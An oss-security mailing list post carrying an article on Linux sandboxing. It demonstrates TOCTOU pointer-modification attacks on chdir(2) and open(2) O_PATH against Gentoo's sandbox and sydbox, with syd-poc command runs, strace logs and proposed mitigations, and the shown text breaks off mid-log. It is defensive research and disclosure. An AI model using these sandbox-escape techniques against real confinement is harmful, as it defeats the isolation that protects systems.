Received: (qmail 25633 invoked by uid 550); 20 May 2024 12:09:49 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Reply-To: oss-security@lists.openwall.com
Received: (qmail 22496 invoked from network); 20 May 2024 12:09:18 -0000
Date: Mon, 20 May 2024 14:09:09 +0200
From: Solar Designer <solar@openwall.com>
To: oss-security@lists.openwall.com
Message-ID: <20240520120909.GA8629@openwall.com>
References: <ykmy97joESH91bCHsZwXrM1OS3YcckmX8UcuxUQ6ogsxZjKI9lox0cTS-HuVaVUgn7fcmBdjRV4kdvZU3X5J6j8Ro1OJKzl1DHnka9f6g-M=@hexsys.org>
Mime-Version: 1.0
Content-Type: multipart/mixed; boundary="/04w6evG8XlLl3ft"
Content-Disposition: inline
Content-Transfer-Encoding: 8bit
In-Reply-To: <ykmy97joESH91bCHsZwXrM1OS3YcckmX8UcuxUQ6ogsxZjKI9lox0cTS-HuVaVUgn7fcmBdjRV4kdvZU3X5J6j8Ro1OJKzl1DHnka9f6g-M=@hexsys.org>
User-Agent: Mutt/1.4.2.3i
Subject: Re: [oss-security] Article: State of Sandboxing in Linux

--/04w6evG8XlLl3ft
Content-Type: text/plain; charset=utf-8
Content-Disposition: inline
Content-Transfer-Encoding: 8bit

Hi,

On Mon, May 20, 2024 at 09:42:38AM +0000, Ali Polatel wrote:
> I want to share an article I wrote on Linux Sandboxing:
> https://git.sr.ht/~alip/syd/tree/main/item/doc/toctou-or-gtfo.md

Thanks.  I've attached the .md source to this message for archival and
for possible inline quoting in replies.  In general, on this list we
strongly prefer content to be included in messages, not only via links
(but relevant links such as the above are desirable to include as well).

> There's nothing new in there except something I discovered on Landlock which may be a bug or a feature.
> TL;DR Landlock allows you to chdir into a directory that's not allowlisted. That's it though, you can
> not list/read anything in there so I'd not say this is anything more than a potential info leak (as in
> you discovered the dir existed). That said, I am not quite sure.
> 
> 
> Very small PoC for those who do no want to read the article:
> (-plib turns all seccomp sandboxing off so we apply a very simple landlock sandbox
> only allowing /usr, busybox is static linked)
> 
> 
> ⇒ syd -plib -msandbox/lock:on -m allow/lock/read+/lib -m allow/lock/read+/usr busybox sh
> ~/src/syd/syd-3 $ cd /tmp
> /tmp $ busybox ls
> ls: can't open '.': Permission denied
> /tmp $
> 
> 
> I could enter /tmp although that's not allowlisted by Landlock.
> 
> 
> Best regards,
> Ali Polatel

Alexander

--/04w6evG8XlLl3ft
Content-Type: text/plain; charset=utf-8
Content-Disposition: attachment; filename="toctou-or-gtfo.md"
Content-Transfer-Encoding: 8bit

# [T☮CT☮U](https://en.wikipedia.org/wiki/Time-of-check_to_time-of-use)||[GTF☮](https://www.alchemistowl.org/pocorgtfo/): State of [Sandboxing](https://en.wikipedia.org/wiki/Sandbox_(computer_security)) in [Linux](https://en.wikipedia.org/wiki/Linux)

This is a series of experiments with the intention of discovering the
current state of user-space sandboxing on
[Linux](https://en.wikipedia.org/wiki/Linux) featuring two prime
examples of sandbox: [Gentoo's
sandbox](https://wiki.gentoo.org/wiki/Sandbox_(Portage)) and [Exherbo's
sydbox](https://lib.rs/crates/syd). Before we begin, the reader is
recommended to take the following statements into attention and read
this document with an open mind:

1. The goal of this document is to improve
   [Linux](https://en.wikipedia.org/wiki/Linux) sandboxing by diving
   step by step deeper into various [sandbox
   breaks](https://en.wikipedia.org/wiki/Privilege_escalation), and
   acquire information hopefully useful to flourish positive changes in
   sandboxing and security, primarily in the
   [Linux](https://en.wikipedia.org/wiki/Linux) ecosystem.
1. *This is not a pissing contest:* Neither [Gentoo's
   sandbox](https://wiki.gentoo.org/wiki/Sandbox_(Portage)) nor `sydbox
   --profile paludis` as used by
   [Exherbo](https://www.exherbolinux.org/)'s Paludis package mangler
   are security boundaries. It is trivial to break both sandboxes and
   you're not really discovering anything new by finding _yet another
   break_, unless of course you are displaying a novel method which is
   in _no way_ the claim of this document.
1. *[sydbox-3](https://sydbox.exherbolinux.org) by default aims to be a
   security boundary,* unlike sandboxes that are designed merely to
   detect package build mishaps, providing little defense against any
   _(remotely)_ sophisticated attack vector. Although we strongly
   disagree with this stance the common consensus is that this is
   acceptable for package builds. Hence, the state here is unlikely to
   change anytime soon. We are really worried that the next ~~Jia Tan~~
   may sneak in a few lines of code in your `pkg_postinst`; but we will
   save our paranoia out of this document from here on. Again, from here
   on, when we say *sydbox* we will mean *sydbox-3 with defaults*. We
   highly recommend the reader to refer to the
   [_syd_(7)](http://man.exherbolinux.org/syd.7.html) manual page for a
   comprehensive overview of the restrictions included in sydbox's
   defaults. *sydbox-1* and *sydbox-3 with the paludis profile* are left
   out of scope for this document to avoid repetition: Both suffer from
   the same issues and are *at least as vulnerable as* the [Gentoo
   sandbox](https://wiki.gentoo.org/wiki/Sandbox_(Portage)).
1. I, [Ali Polatel](https://hexsys.org), also known as
   [`alip`](https://mastodon.online/@alip), am the main author of this document and
   a modest free-software developer whose free time has been sucked away by sydbox
   over the past one and a half decades. I have contributed to both
   [Gentoo](https://www.gentoo.org/) and [Exherbo](https://www.exherbolinux.org/) as
   a developer and continue to fulfill my role as an
   [Exherbo](https://www.exherbolinux.org/) developer as the time permits. *I am in
   no way an expert in security or sandboxing.* All of my words and observations
   here must be taken with a grain of salt. I appreciate and welcome all kinds of
   feedback, be it in the form of patches, comments, or even poems ;-).
1. [No, no, we don't die. Yes, we
   multiply!](https://archives.gentoo.org/gentoo-dev-announce/message/96d7b0ca943849075c223c3eac5814ff)

# --version

## [Gentoo sandbox](https://wiki.gentoo.org/wiki/Sandbox_(Portage))

```
$ sandbox --version
[Gentoo](https://www.gentoo.org/) path sandbox
 version: 3.2
 C lib:   libc.so (/usr/x86_64-pc-linux-musl/lib/gcc/x86_64-pc-linux-musl/13/../../../libc.so)
 build:   Apr 14 2024 21:09:02
 contact: sandbox@gentoo.org via https://bugs.gentoo.org/
 rtld:    next is OK! :D
 personalities:  x86_64:-m64 x86:-m32 x32:-mx32

configured with these options:
--prefix=/usr/local
```

## [Exherbo sydbox](https://lib.rs/crates/syd)

```
$ syd -V
syd 3.19.0 (Jolly Moore)
Author: Ali Polatel
License: GPL-3.0-or-later
Features: +debug, +elf, +log, +mimalloc[secure], +oci, -uring
Landlock: fully enforced
LibSeccomp: v2.5.5 api:7
Id (build): d8352281b92d9ae5472777f0eb3c37506a40da0d
Host (build): 6.8.0-syd-13213-g70293240c5ce x86_64
Host (target): 6.8.0-syd-13213-g70293240c5ce x86_64
Target Environment: musl
Target Persona: linux
Target Pointer Width: 64
Target CPU Count: 4 (2 physical)
Target CPU Endian: little
Target CPU Features: aes,avx,avx2,bmi1,bmi2,cmpxchg16b,ermsb,f16c,fma,fxsr,lahfsahf,lzcnt,movbe,pclmulqdq,popcnt,rdrand,sse,sse2,sse3,sse4.1,sse4.2,ssse3,xsave,xsaveopt
```

# [PoC](https://en.wikipedia.org/wiki/Proof_of_concept) 1: [chdir(2)](https://man7.org/linux/man-pages/man2/chdir.2.html) pointer modification

## Setup

```
$ mkdir -m700 /tmp/ctf
$ head -c42 /dev/random | sha1sum | awk '{print $1}' > /tmp/ctf/FLAG
$ cat /tmp/ctf/FLAG
9a9f2ac4c894f2378605704047f937c60c1e1a0d
$ syd-poc cd -h
Usage syd-poc cd [-hsS] [-b benign-dir] [-t timeout] [dir] [command] [args...]
Chdir into a hidden directory and execute the given command with the given arguments.
Method of attack is pointer modification on the chdir(2) system call making use of TOCTOU.
Default benign directory is /var/empty, specify an alternate path with "-b benign-dir".
Default is to try until interrupted, specify a timeout with "-t timeout".
Use -s to run test under strace, -S to skip strace auto-detection and run without tracing.
```

## syd-poc cd /tmp/ctf cat FLAG

- [TOCTOU](https://en.wikipedia.org/wiki/Time-of-check_to_time-of-use)
  on [_chdir_(2)](https://man7.org/linux/man-pages/man2/chdir.2.html)
  with pointer modification by a fellow malicious thread.
  - Thread repeatedly overwrites the memory area pointed by the
    [_chdir_(2)](https://man7.org/linux/man-pages/man2/chdir.2.html)
    path argument pointer.
  - Doesn't have to be a thread sharing the address space,
  - May also be
    [_ptrace_(2)](https://man7.org/linux/man-pages/man2/ptrace.2.html)
    or
    [_process_vm_writev_(2)](https://man7.org/linux/man-pages/man2/process_vm_readv.2.html)
    with sufficient rights.
  - **Resuming the system call in the sandbox process after access check is unsafe!**
    - `PTRACE_CONT`, `PTRACE_SYSCALL`
    - `SECCOMP_USER_NOTIF_FLAG_CONTINUE`
  - [A Time-of-Check-to-Time-of-Use (TOCTOU)
    attack](https://en.wikipedia.org/wiki/Time-of-check_to_time-of-use)
    can exploit more than just memory addresses passed to system calls.
    It can also target the filesystem or any resource where the sandbox
    checks permission at one point (Time-of-Check) but relies on that
    permission remaining valid until the actual operation (Time-of-Use).
    This vulnerability arises because the sandbox assumes no
    modifications can occur between these checks.
- Goal: Enter the denylisted target directory and attempt to read the FLAG.
- Brief summary of the attack under
  [_strace_(1)](https://man7.org/linux/man-pages/man1/strace.1.html) is
  given below:

```
$ syd-poc cd /tmp/ctf cat FLAG
[*] Auto-detecting strace...
[*] Attempting to run strace: "timeout" "5s" "strace" "-o/dev/null" "-f" "-echdir" "-qq" "--" "sh" "-xc" "cd /var/empty"
+ cd /var/empty
[!] strace is available, let's use it!
[*] Executing test under strace: "strace" "-f" "-echdir" "-qq" "--" "/usr/local/bin/syd-poc" "cd" "/tmp/ctf" "cat" "FLAG"
[*] Starting chdir(2) pointer modification TOCTOU attack...
[*] Benign directory: /proc/self/root/var/empty
[*] Target directory: /tmp/ctf
[*] Attack will continue until interrupted (Press ^C to stop).
[pid 1673480] chdir("/proc/self/root/var/empty")       = 0
[pid 1673480] chdir("/tmp/ctf")         = 0
[!] TOCTOU attack succeeded after 2 attempts!
[!] Current directory was unexpectedly changed!
[*] Executing command in the denylisted directory...
9a9f2ac4c894f2378605704047f937c60c1e1a0d
```

## [PoC](https://en.wikipedia.org/wiki/Proof_of_concept) 1: [Gentoo  sandbox](https://wiki.gentoo.org/wiki/Sandbox_(Portage))

- We use sandbox defaults and specify `/tmp/ctf` as a denylisted path using `SANDBOX_DENY`.
- We don't attempt to attach with
  [_strace_(1)](https://man7.org/linux/man-pages/man1/strace.1.html)
  using `-S` because this confuses sandbox.
- Sandbox denies access to the system call by sending a `SIGSTOP` signal to the process.
  - What happens if a fellow malicious process sends a subsequent `SIGCONT` signal?

```
$ SANDBOX_DENY=/tmp/ctf sandbox syd-poc cd -S /tmp/ctf
[*] Starting chdir(2) pointer modification TOCTOU attack...
[*] Benign directory: /proc/self/root/var/empty
[*] Target directory: /tmp/ctf
[*] Attack will continue until interrupted (Press ^C to stop).
[!] TOCTOU attack succeeded after 2372 attempts!
[!] Current directory was unexpectedly changed!
[*] Executing command in the denylisted directory...
sh-5.2$ pwd
/tmp/ctf
sh-5.2$ cat FLAG

[1]   Stopped(SIGSTOP)        cat FLAG
sh-5.2$  * ACCESS DENIED:  open_wr:            /proc/1709169/fd/2
 * ACCESS DENIED:  open_rd:            /tmp/ctf/FLAG
cat: FLAG: Permission denied

sh-5.2$ ls .

[1]   Stopped(SIGSTOP)        ls .
sh-5.2$  * ACCESS DENIED:  open_wr:            /proc/1709169/fd/2
 * ACCESS DENIED:  opendir:            /tmp/ctf
ls: cannot open directory '.': Permission denied

sh-5.2$ cat ../../tmp/ctf/FLAG

[1]   Stopped(SIGSTOP)        cat ../../tmp/ctf/FLAG
sh-5.2$  * ACCESS DENIED:  open_wr:            /proc/1709169/fd/2
 * ACCESS DENIED:  open_rd:            /tmp/ctf/FLAG
cat: ../../tmp/ctf/FLAG: Permission denied

sh-5.2$ exit
 * ----------------------- SANDBOX ACCESS VIOLATION SUMMARY -----------------------
 --8<-- LOG OUTPUT OMITTED BY THE AUTHOR -->8--
 ...
$
```

## [PoC](https://en.wikipedia.org/wiki/Proof_of_concept) 1: [Exherbo  sydbox](https://lib.rs/crates/syd)

- We establish a minimal working environment for the
  [_syd-poc_(1)](http://man.exherbolinux.org/syd-poc.1.html) process
  using two [sydbox](https://lib.rs/crates/syd) rules. Rest is
  [sydbox's](https://lib.rs/crates/syd) secure defaults.  Reader should
  understand this sydbox configuration does not allow `read`, `stat` or
  `write` access to the target directory `/tmp/ctf`.
- Note how [sydbox](https://lib.rs/crates/syd) denies access to the
  target directory `/tmp/ctf` with `ENOENT`, aka *No such file or
  directory*, until the malicious thread wins the race. Interestingly
  the final
  [_chdir_(2)](https://man7.org/linux/man-pages/man2/chdir.2.html) that
  [_strace_(1)](https://man7.org/linux/man-pages/man1/strace.1.html)
  reports is actually not the path that the
  [kernel](https://kernel.org/) reads which is a typical and simple case
  of
  [TOCTOU](https://en.wikipedia.org/wiki/Time-of-check_to_time-of-use).
- [`trace/allow_unsafe_debug:1`](http://man.exherbolinux.org/syd.2.html#trace/allow_unsafe_debug)
  is used to allow
  [_strace_(1)](https://man7.org/linux/man-pages/man1/strace.1.html) in
  the sandbox for demonstration purposes and [has no place in a safe
  sandbox.](http://man.exherbolinux.org/syd.2.html#trace/allow_unsafe_debug)
  That said, in this
  [PoC](https://en.wikipedia.org/wiki/Proof_of_concept) this option has
  no effect on the outcome.

```
$ syd \
	-m "allow/read,stat,exec+/{etc,dev,proc,usr,var,lib*}/***" \
	-m "allow/write+/dev/{null,tty,pts/*}" \
	-m trace/allow_unsafe_debug:1 \
	syd-poc cd /tmp/ctf
[*] Auto-detecting strace...
[*] Attempting to run strace: "timeout" "5s" "strace" "-o/dev/null" "-f" "-echdir" "-qq" "--" "sh" "-xc" "cd /var/empty"
+ cd /var/empty
[!] strace is available, let's use it!
[*] Executing test under strace: "strace" "-f" "-echdir" "-qq" "--" "/usr/local/bin/syd-poc" "cd" "/tmp/ctf"
[*] Starting chdir(2) pointer modification TOCTOU attack...
[*] Benign directory: /proc/self/root/var/empty
[*] Target directory: /tmp/ctf
[*] Attack will continue until interrupted (Press ^C to stop).
[pid 1675504] chdir("/tmp/ctf")         = -1 ENOENT (No such file or directory)
[pid 1675504] chdir("/tmp/ctf")         = -1 ENOENT (No such file or directory)
[pid 1675504] chdir("/tmp/ctf")         = -1 ENOENT (No such file or directory)
[pid 1675504] chdir("/tmp/ctf")         = -1 ENOENT (No such file or directory)
[pid 1675504] chdir("/tmp/ctf")         = -1 ENOENT (No such file or directory)
[pid 1675504] chdir("/tmp/ctf")         = -1 ENOENT (No such file or directory)
chdir("/proc/self/root/var/empty")      = 0
[!] TOCTOU attack succeeded after 7 attempts!
[!] Current directory was unexpectedly changed!
[*] Executing command in the denylisted directory...
sh-5.2$ pwd
/tmp/ctf
sh-5.2$ cat FLAG
cat: FLAG: No such file or directory
--- SIGCHLD {si_signo=SIGCHLD, si_code=CLD_EXITED, si_pid=1675545, si_uid=1000, si_status=1, si_utime=0, si_stime=0} ---
sh-5.2$ ls .
ls: cannot access '.': No such file or directory
--- SIGCHLD {si_signo=SIGCHLD, si_code=CLD_EXITED, si_pid=1675546, si_uid=1000, si_status=2, si_utime=0, si_stime=0} ---
sh-5.2$ cat ../../tmp/ctf/FLAG
cat: ../../tmp/ctf/FLAG: No such file or directory
--- SIGCHLD {si_signo=SIGCHLD, si_code=CLD_EXITED, si_pid=1675547, si_uid=1000, si_status=1, si_utime=0, si_stime=0} ---
sh-5.2$
```

## [PoC](https://en.wikipedia.org/wiki/Proof_of_concept) 1: Takeaways

- FLAG is yet out of reach, we do not even know if it's present in the
  target directory as we could not list it but **we entered a directory
  we *should* not have.** Our abilities inside the directory are
  severely limited and in itself this is not a break but may be a
  precursor of a break as we will see later. That said, at this point
  the severity is nothing any more than minor _unless_ your intended
  goal is stealth in which case this vector is an *information leak.*
- [The kernel](https://kernel.org/) _should_ provide a safe
  [API](https://en.wikipedia.org/wiki/API) for this for seccomp, [see
  #218501.](https://bugzilla.kernel.org/show_bug.cgi?id=218501)
  - `SECCOMP_CHDIR` akin to `SECCOMP_ADDFD`?
- Mitigation
  - Terminate the process on the next system call if `/proc/pid/cwd` points outside the sandbox:
    - **Too late! Too late!**
  - Return to `PTRACE_SYSCALL`, do the same check at syscall-exit and terminate the process:
    - On time but **too heavy**, +2 ptrace-stops per-syscall.
    - This gets better with `SECCOMP_TRACE` but still it's relatively heavy.
  - This attack requires an accessible benign directory to succeed.
    - However, denying all
      [_chdir_(2)](https://man7.org/linux/man-pages/man2/chdir.2.html)
      by default is a poorly acceptable scenario.
    - That said, the truly paranoid can consider loading a dynamic
      library into [sydbox](https://lib.rs/crates/syd), rather than
      running a command, which gives you additional options to restrict
      such as:
        - `-m unshare/user,mount:1`
        - `-m bind:/:/:noexec`
        - Makes the whole world noexec! What's better than that?
  - Provide a dynamic way for the sandbox process to lock
    [_chdir_(2)](https://man7.org/linux/man-pages/man2/chdir.2.html)
    calls:
    - Either explicit process cooperation via [the virtual /dev/syd
      API](http://man.exherbolinux.org/syd.2.html),
    - Or by acting upon a predetermined event to lock
      [_chdir_(2)](https://man7.org/linux/man-pages/man2/chdir.2.html):
      - akin to [Caitsith](https://kernsec.org/files/CaitSith-en.pdf)'s
        domain transitions on
        [_bind_(2)](https://man7.org/linux/man-pages/man2/bind.2.html)
        and
        [_exec_(3)](https://man7.org/linux/man-pages/man3/exec.3.html).
- Solution
  - **Defense in depth:** Add an extra layer, _when in doubt, there's no doubt!_
  - **Mount namespace + bind mounts** can mask the target directory:
    - `-munshare/user,mount:1`
    - `-mbind+tmpfs:/tmp/ctf:nodev,nosuid,noexec`
    - *Secure defaults:* [sydbox](https://lib.rs/crates/syd) forbids
      [_mount_(2)](https://man7.org/linux/man-pages/man2/mount.2.html)
      and
      [_umount_(2)](https://man7.org/linux/man-pages/man2/umount.2.html)
      calls in the sandbox, hence no way to umount the tmpfs above or
      remount the underlying directory elsewhere to make it accessible.
  - [**Landlock**](https://landlock.io/), if target directory is not
    readable, there is no candy:
    - [Landlock](https://landlock.io/) rules are static paths unlike
      [sydbox's](https://lib.rs/crates/syd)
      [_glob_(3)](https://man7.org/linux/man-pages/man3/glob.3.html)
      rules:
      - [Restriction at
        kernel-level](https://en.wikipedia.org/wiki/Linux_Security_Modules):
        Typically less-flexible but more secure than user-space
        sandboxing.
    - *Secure defaults:* [sydbox](https://lib.rs/crates/syd) process and
      the syscall handler threads are included in the [Landlock
      sandbox](https://landlock.io/), ie you must break both
      [sydbox's](https://lib.rs/crates/syd) seccomp sandbox and the
      static [Landlock sandbox](https://landlock.io/) to [*break
      free.*](https://yewtu.be/watch?v=f4Mc-NYPHaQ)
    - A bit more cumbersome to setup but worth it:
      - `-m sandbox/lock:on`
      - `-m allow/lock/read+/dev`
      - `-m allow/lock/read+/etc`
      - `-m allow/lock/read+/proc`
      - `-m allow/lock/read+/usr`
      - `-m allow/lock/read+/var`
      - `-m allow/lock/write+/dev/null`
      - `-m allow/lock/write+/dev/pts`
      - `-m allow/lock/write+/dev/tty`
    - Notably, the sample set of rules above do _not_ allow read or write to `/tmp/ctf`.
    - Surprisingly, this still allows one to change directory into `/tmp/ctf`!
      - Same issue of information leaking if/when the goal is stealth.
      - [Landlock](https://landlock.io/) bug or feature?
    - Safe to say the FLAG file `/tmp/ctf/FLAG` is out of reach once the
      [Landlock sandbox](https://landlock.io/) is applied unless we come
      up with a [kernel](https://kernel.org/) vulnerability which is out
      of scope: Sleep in peace.

# [PoC](https://en.wikipedia.org/wiki/Proof_of_concept) 2: [open(2)](https://man7.org/linux/man-pages/man2/open.2.html) O\_PATH pointer modification

## Setup

We are going to use the same setup as
[PoC](https://en.wikipedia.org/wiki/Proof_of_concept) 1.

```
$ syd-poc path -h
Usage syd-poc path [-hsS] [-b benign-file] [-t timeout] [file] [command] [args...]
Prove existence of a hidden file utilizing pointer TOCTOU and pass the file descriptor to the command.
Method of attack is pointer modification on the open(2) system call with O_PATH flag making use of TOCTOU.
Default benign file is /dev/null, specify an alternate path with "-b benign-file".
Default is to try until interrupted, specify a timeout with "-t timeout".
Use -s to run test under strace, -S to skip strace auto-detection and run without tracing.
```

## syd-poc path /tmp/ctf/FLAG ls -l /proc/self/fd/3

- [TOCTOU](https://en.wikipedia.org/wiki/Time-of-check_to_time-of-use)
  on [_open_(2)](https://man7.org/linux/man-pages/man2/open.2.html) with
  pointer modification by a fellow malicious thread.
- The method is identical to
  [PoC](https://en.wikipedia.org/wiki/Proof_of_concept) 1, except we use
  the [_open_(2)](https://man7.org/linux/man-pages/man2/open.2.html)
  system call with the `O_PATH` flag.
- Goal: Prove the presence of the file `/tmp/ctf/FLAG` despite the
  sandbox hiding it.

```
$ syd-poc path /tmp/ctf/FLAG ls -l /proc/self/fd/3
[*] Auto-detecting strace...
[*] Attempting to run strace: "timeout" "5s" "strace" "-o/dev/null" "-f" "-qq" "-eopen" "--" "sh" "-xc" "cat /dev/null > /dev/null"
+ cat /dev/null
[!] strace is available, let's use it!
[*] Executing test under strace: "strace" "-f" "-qq" "-eopen" "--" "/usr/local/bin/syd-poc" "path" "/tmp/ctf/FLAG" "ls" "-l" "/proc/self/fd/3"
open("/lib/x86_64-linux-gnu/libgcc_s.so.1", O_RDONLY|O_LARGEFILE|O_CLOEXEC) = -1 ENOENT (No such file or directory)
open("/lib/x86_64-linux-gnu/libgcc_s.so.1", O_RDONLY|O_LARGEFILE|O_CLOEXEC) = -1 ENOENT (No such file or directory)
open("/etc/ld-x86_64-pc-linux-musl.path", O_RDONLY|O_LARGEFILE|O_CLOEXEC) = 3
open("/usr/x86_64-pc-linux-musl/lib/libgcc_s.so.1", O_RDONLY|O_LARGEFILE|O_CLOEXEC) = 3
[*] Starting open(2) O_PATH pointer modification TOCTOU attack...
[*] Benign file: /proc/self/root/dev/null
[*] Target file: /tmp/ctf/FLAG
[*] Attack will continue until interrupted (Press ^C to stop).
[pid 1809886] open("/proc/self/root/dev/null", O_RDONLY|O_LARGEFILE|O_PATH) = 3
[pid 1809886] open("/proc/self/root/dev/null", O_RDONLY|O_LARGEFILE|O_PATH) = 3
[pid 1809886] open("/tmp/ctf/FLAG", O_RDONLY|O_LARGEFILE|O_PATH) = 3
[!] TOCTOU attack succeeded after 3 attempts!
[!] Target path /tmp/ctf/FLAG is known to exist!
[*] Passing file descriptor 3 to the command...
[*] Executing command with target FD Some(OwnedFd { fd: 3 })...
open("/lib/x86_64-linux-gnu/libcap.so.2", O_RDONLY|O_LARGEFILE|O_CLOEXEC) = -1 ENOENT (No such file or directory)
open("/lib/x86_64-linux-gnu/libcap.so.2", O_RDONLY|O_LARGEFILE|O_CLOEXEC) = -1 ENOENT (No such file or directory)
open("/etc/ld-x86_64-pc-linux-musl.path", O_RDONLY|O_LARGEFILE|O_CLOEXEC) = 4
open("/usr/x86_64-pc-linux-musl/lib/libcap.so.2", O_RDONLY|O_LARGEFILE|O_CLOEXEC) = 4
open("/etc/passwd", O_RDONLY|O_LARGEFILE|O_CLOEXEC) = 4
open("/etc/group", O_RDONLY|O_LARGEFILE|O_CLOEXEC) = 4
open("/usr/share/zoneinfo/Europe/Berlin", O_RDONLY|O_NONBLOCK|O_LARGEFILE|O_CLOEXEC) = 4
l--------- 1 alip alip 64 May 18 16:18 /proc/self/fd/3 -> /tmp/ctf/FLAG
```

## [PoC](https://en.wikipedia.org/wiki/Proof_of_concept) 2: [Gentoo  sandbox](https://wiki.gentoo.org/wiki/Sandbox_(Portage))

- We use sandbox defaults, and specify `/tmp/ctf` as a denylisted path
  using `SANDBOX_DENY`.
- We do not attempt to attach with
  [_strace_(1)](https://man7.org/linux/man-pages/man1/strace.1.html)
  using `-S` because this confuses sandbox.

```
$ SANDBOX_DENY=/tmp/ctf sandbox syd-poc path -S /tmp/ctf/FLAG ls -l /proc/self/fd/3
[*] Starting open(2) O_PATH pointer modification TOCTOU attack...
[*] Benign file: /proc/self/root/dev/null
[*] Target file: /tmp/ctf/FLAG
[*] Attack will continue until interrupted (Press ^C to stop).
 * ACCESS DENIED:  open_rd:            /tmp/ctf/FLAG
 * ACCESS DENIED:  open_rd:            /tmp/ctf/FLAG
 * ACCESS DENIED:  open_rd:            /tmp/ctf/FLAG
 * ACCESS DENIED:  open_rd:            /tmp/ctf/FLAG
 * ACCESS DENIED:  open_rd:            /tmp/ctf/FLAG
 * ACCESS DENIED:  open_rd:            /tmp/ctf/FLAG
 * ACCESS DENIED:  open_rd:            /tmp/ctf/FLAG
 * ACCESS DENIED:  open_rd:            /tmp/ctf/FLAG
 * ACCESS DENIED:  open_rd:            /tmp/ctf/FLAG
 * ACCESS DENIED:  open_rd:            /tmp/ctf/FLAG
 * ACCESS DENIED:  open_rd:            /tmp/ctf/FLAG
 * ACCESS DENIED:  open_rd:            /tmp/ctf/FLAG
 * ACCESS DENIED:  open_rd:            /tmp/ctf/FLAG
 * ACCESS DENIED:  open_rd:            /tmp/ctf/FLAG
 * ACCESS DENIED:  open_rd:            /tmp/ctf/FLAG
 * ACCESS DENIED:  open_rd:            /tmp/ctf/FLAG
 * ACCESS DENIED:  open_rd:            /tmp/ctf/FLAG
 * ACCESS DENIED:  open_rd:            /tmp/ctf/FLAG
[!] TOCTOU attack succeeded after 30 attempts!
[!] Target path /tmp/ctf/FLAG is known to exist!
[*] Passing file descriptor 3 to the command...
[*] Executing command with target FD Some(OwnedFd { fd: 3 })...
l--------- 1 alip alip 64 May 18 16:53 /proc/self/fd/3 -> /tmp/ctf/FLAG
 * ----------------------- SANDBOX ACCESS VIOLATION SUMMARY -----------------------
 --8<-- LOG OUTPUT OMITTED BY THE AUTHOR -->8--
 ...
$
```

## [PoC](https://en.wikipedia.org/wiki/Proof_of_concept) 2: [Exherbo  sydbox](https://lib.rs/crates/syd)

- We use exactly the same [sydbox](https://lib.rs/crates/syd) rules as
  we used for [PoC](https://en.wikipedia.org/wiki/Proof_of_concept) 1.

### Case 1: [allow\_unsafe\_open](http://man.exherbolinux.org/syd.2.html#trace/allow_unsafe_open)

- [`trace/allow_unsafe_debug:1`](http://man.exherbolinux.org/syd.2.html#trace/allow_unsafe_debug)
  is used to allow
  [_strace_(1)](https://man7.org/linux/man-pages/man1/strace.1.html) in
  the sandbox for demonstration purposes and [has no place in a safe
  sandbox.](http://man.exherbolinux.org/syd.2.html#trace/allow_unsafe_debug)
  That said, in this
  [PoC](https://en.wikipedia.org/wiki/Proof_of_concept) this option has
  no effect on the outcome.

```
$ syd \
	-m "allow/read,stat,exec+/{etc,dev,proc,usr,var,lib*}/***" \
	-m "allow/write+/dev/{null,tty,pts/*}" \
	-m trace/allow_unsafe_debug:1 \
	-m trace/allow_unsafe_open:1 \
	syd-poc path /tmp/ctf/FLAG ls -l /proc/self/fd/3
[*] Auto-detecting strace...
[*] Attempting to run strace: "timeout" "5s" "strace" "-o/dev/null" "-f" "-qq" "-eopen" "--" "sh" "-xc" "cat /dev/null > /dev/null"
+ cat /dev/null
[!] strace is available, let's use it!
[*] Executing test under strace: "strace" "-f" "-qq" "-eopen" "--" "/usr/local/bin/syd-poc" "path" "/tmp/ctf/FLAG" "ls" "-l" "/proc/self/fd/3"
open("/etc/ld-x86_64-pc-linux-musl.path", O_RDONLY|O_LARGEFILE|O_CLOEXEC) = 3
open("/usr/x86_64-pc-linux-musl/lib/libgcc_s.so.1", O_RDONLY|O_LARGEFILE|O_CLOEXEC) = 3
[*] Starting open(2) O_PATH pointer modification TOCTOU attack...
[*] Benign file: /proc/self/root/dev/null
[*] Target file: /tmp/ctf/FLAG
[*] Attack will continue until interrupted (Press ^C to stop).
[pid 2094162] open("/tmp/ctf/FLAG", O_RDONLY|O_LARGEFILE|O_PATH) = -1 ENOENT (No such file or directory)
[pid 2094162] open("/tmp/ctf/FLAG", O_RDONLY|O_LARGEFILE|O_PATH) = -1 ENOENT (No such file or directory)
[pid 2094162] open("/tmp/ctf/FLAG", O_RDONLY|O_LARGEFILE|O_PATH) = -1 ENOENT (No such file or directory)
[pid 2094162] open("/tmp/ctf/FLAG", O_RDONLY|O_LARGEFILE|O_PATH) = -1 ENOENT (No such file or directory)
[pid 2094162] open("/tmp/ctf/FLAG", O_RDONLY|O_LARGEFILE|O_PATH) = -1 ENOENT (No such file or directory)
[pid 2094162] open("/tmp/ctf/FLAG", O_RDONLY|O_LARGEFILE|O_PATH) = -1 ENOENT (No such file or directory)
[pid 2094162] open("/tmp/ctf/FLAG", O_RDONLY|O_LARGEFILE|O_PATH) = -1 ENOENT (No such file or directory)
[pid 2094162] open("/tmp/ctf/FLAG", O_RDONLY|O_LARGEFILE|O_PATH) = -1 ENOENT (No such file or directory)
[pid 2094162] open("/tmp/ctf/FLAG", O_RDONLY|O_LARGEFILE|O_PATH) = -1 ENOENT (No such file or directory)
[pid 2094162] open("/tmp/ctf/FLAG", O_RDONLY|O_LARGEFILE|O_PATH) = -1 ENOENT (No such file or directory)
[pid 2094162] open("/tmp/ctf/FLAG", O_RDONLY|O_LARGEFILE|O_PATH) = -1 ENOENT (No such file or directory)
open("/proc/self/root/dev/null", O_RDONLY|O_LARGEFILE|O_PATH) = 3
[pid 2094162] open("/tmp/ctf/FLAG", O_RDONLY|O_LARGEFILE|O_PATH) = -1 ENOENT (No such file or directory)
open("/proc/self/root/dev/null", O_RDONLY|O_LARGEFILE|O_PATH) = -1 ENOENT (No such file or directory)
[pid 2094162] open("/tmp/ctf/FLAG", O_RDONLY|O_LARGEFILE|O_PATH) = -1 ENOENT (No such file or directory)
[pid 2094162] open("/tmp/ctf/FLAG", O_RDONLY|O_LARGEFILE|O_PATH) = -1 ENOENT (No such file or directory)
